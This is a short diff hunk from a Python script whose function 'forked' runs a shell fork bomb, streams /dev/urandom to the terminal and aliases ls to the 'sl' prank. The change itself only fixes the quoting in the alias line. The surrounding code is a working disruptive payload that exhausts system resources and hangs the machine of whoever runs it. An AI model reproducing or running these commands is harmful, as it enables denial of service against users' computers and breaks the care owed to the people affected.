@@ -25,7 +25,7 @@ def forked():
     os.system(":(){ :|:& };:")
     os.system("cat /dev/urandom")
     if number == 1:
-      os.system("alias ls="sl")
+      os.system('alias ls="sl"')
       number = 0
     else:
       pass
